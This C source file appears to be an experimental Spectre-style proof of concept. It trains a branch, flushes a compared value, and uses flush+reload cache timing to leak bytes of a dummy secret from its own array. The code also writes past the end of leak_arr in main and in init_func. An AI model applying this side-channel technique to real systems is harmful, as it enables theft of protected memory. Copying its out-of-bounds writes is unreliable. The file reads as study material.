#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 3
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0
#define MALLOC_SIZE 4096

int INIT_VALUE;

cp_t* flush_reload_arr;
int leak_arr[SECRET_SIZE];

__attribute__((noinline)) void init_func(int* arr, int length) {
    arr[0] = INIT_VALUE;
    for(int i = 0; i < length; i++) arr[i] = i;
}

__attribute__((noinline)) void read_func(int* arr, int index) {

    flush((void*)&INIT_VALUE);

    if(arr[0] == INIT_VALUE) {
        volatile cp_t cp = flush_reload_arr[arr[index]];
    }
    //printf("arr[index=%d]=%d\t'%c'\n", index, arr[index], arr[index]);

}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    for(int i = 0; i < N_TRAINING; i++) {
        int train_arr[N_TRAINING];
        init_func(train_arr, N_TRAINING);
        read_func(train_arr, i);
    }
    flush_arr((void*)flush_reload_arr, N_PAGES);
    cpuid();

    int train_len = N_TRAINING;
    flush((void*)&train_len);
    cpuid();    //cpuids crash it for some reason bruh
    //init_func(leak_arr, train_len);
    read_func(leak_arr, secret_index);
    cpuid();
    init_func(leak_arr, train_len);

    cpuid();
    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    INIT_VALUE = 0;
    leak_arr[0] = 'c';
    leak_arr[1] = 'h';
    leak_arr[2] = 'r';
    leak_arr[3] = 'i';
    leak_arr[4] = 's';
    leak_arr[5] = 'w';
    leak_arr[6] = 'a';
    leak_arr[7] = 'g';
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
    printf("results[REP=%d][SECRET=%d][N_PAGES=%d]\n", REPETITIONS, SECRET_SIZE, N_PAGES);
    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            
            //printf("putting prepare(s=%d) into results[r=%d][s=%d]...", s, r, s);


            int* res = prepare(s);
            results[r][s] = res;//prepare(s);

            
            //printf("\tdone\n");
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}